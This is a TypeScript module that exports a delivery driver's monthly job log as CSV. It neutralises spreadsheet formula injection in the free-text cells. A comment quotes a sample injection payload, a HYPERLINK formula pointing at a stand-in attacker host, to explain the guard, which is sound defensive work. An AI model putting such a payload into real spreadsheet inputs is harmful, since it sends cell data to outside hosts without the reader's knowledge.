import type { DeliveryLogData } from "@/components/delivery/DeliveryLogView";
import { isErrandKind, ERRAND_LABEL } from "@/lib/delivery/kind";

// ── The 30-day log, as a spreadsheet ────────────────────────────────────────
//
// This exists to settle pay. Somebody asks what they are owed for last month,
// and the owner needs the rows somewhere they can sum, filter and send on.
//
// ── THE PART THAT IS NOT COSMETIC ──────────────────────────────────────────
// A cell beginning with = + - @ or a tab is a FORMULA to Excel, Sheets and
// LibreOffice. Two columns here are free text a stranger typed:
//
//   `what`   — the customer's own words on a Deliver Anything job
//   `reason` — a failure note
//
// So "what are we moving?" is a text box on a public page that lands, unedited,
// in the owner's spreadsheet. A request described as
//
//   =HYPERLINK("http://evil.example/"&A1,"Click")
//
// becomes a live link built from the neighbouring cell the moment the file is
// opened, and the DDE variants can prompt to launch a program. The customer
// never has to be believed for this to work — they only have to be quoted.
//
// Every text cell is therefore prefixed with an apostrophe when it starts with
// one of those characters, which is what makes a spreadsheet treat it as text.
// Numbers are generated here, never taken from input, so they skip the guard
// and stay summable.

const RISKY = /^[=+\-@\t\r]/;

/** One CSV cell: formula-neutralised, then quoted by the ordinary rules. */
function cell(value: unknown): string {
  let s = value == null ? "" : String(value);
  // Order matters: the apostrophe has to land INSIDE the quotes, or the quoting
  // pass would treat it as content and the guard would be visible but inert.
  if (RISKY.test(s)) s = `'${s}`;
  if (/[",\n\r]/.test(s)) s = `"${s.replace(/"/g, '""')}"`;
  return s;
}

/** A number we produced ourselves. Never guarded, so it stays a number. */
function num(cents: number | null | undefined): string {
  return ((cents ?? 0) / 100).toFixed(2);
}

/**
 * Island-local date and time, split into two columns.
 *
 * `YYYY-MM-DD` rather than anything friendlier: it is the only format that
 * sorts correctly as text in every spreadsheet, which is the first thing
 * anybody does to a column of dates. Indian/Mauritius, because a driver
 * settling a Tuesday's work means the Tuesday they worked.
 */
function islandParts(iso: string | null): { date: string; time: string } {
  if (!iso) return { date: "", time: "" };
  const d = new Date(iso);
  if (Number.isNaN(d.getTime())) return { date: "", time: "" };
  const fmt = (opts: Intl.DateTimeFormatOptions) =>
    new Intl.DateTimeFormat("en-CA", { timeZone: "Indian/Mauritius", ...opts }).format(d);
  return {
    date: fmt({ year: "numeric", month: "2-digit", day: "2-digit" }),
    time: fmt({ hour: "2-digit", minute: "2-digit", hour12: false }),
  };
}

const KIND_COLUMN: Record<string, string> = {
  package: "Collect & deliver",
  shop_and_deliver: "Buy & deliver",
  errand: "Do it for me",
};

export const LOG_CSV_HEADERS = [
  "Date",
  "Time",
  "Job",
  "Type",
  "Errand type",
  "Status",
  "Earned (Rs)",
  "Reason",
] as const;

/**
 * The whole file, headers included.
 *
 * `Earned (Rs)` is 0 for anything that was not delivered, so a SUM down the
 * column is the correct total rather than a number nobody was paid. That rule
 * is the same one the two screens draw, and it is the one thing about this
 * export that could start an argument if it were wrong.
 */
export function logToCsv(data: DeliveryLogData): string {
  const lines: string[] = [LOG_CSV_HEADERS.map(cell).join(",")];

  for (const r of data.rows) {
    const { date, time } = islandParts(r.finishedAt);
    const delivered = r.status === "delivered";
    lines.push(
      [
        cell(date),
        cell(time),
        cell(r.what),
        cell(r.requestKind ? (KIND_COLUMN[r.requestKind] ?? r.requestKind) : "Shop delivery"),
        cell(isErrandKind(r.errandKind) ? ERRAND_LABEL[r.errandKind] : ""),
        cell(r.status.replace(/_/g, " ")),
        num(delivered ? r.earning : 0),
        cell(r.failureReason ?? ""),
      ].join(","),
    );
  }

  // CRLF: the line ending in RFC 4180, and the one Excel on Windows expects.
  return lines.join("\r\n");
}

/**
 * What the saved file is called.
 *
 * The driver's name is in it because the owner will end up with several of
 * these in one folder while settling a month, and "log.csv" four times over is
 * how the wrong one gets sent to somebody.
 */
export function logFileName(driverName: string | undefined, days: number): string {
  const who = (driverName ?? "my")
    .toLowerCase()
    .replace(/[^a-z0-9]+/g, "-")
    .replace(/^-+|-+$/g, "");
  return `roule-rodrigues-${who || "driver"}-last-${days}-days.csv`;
}
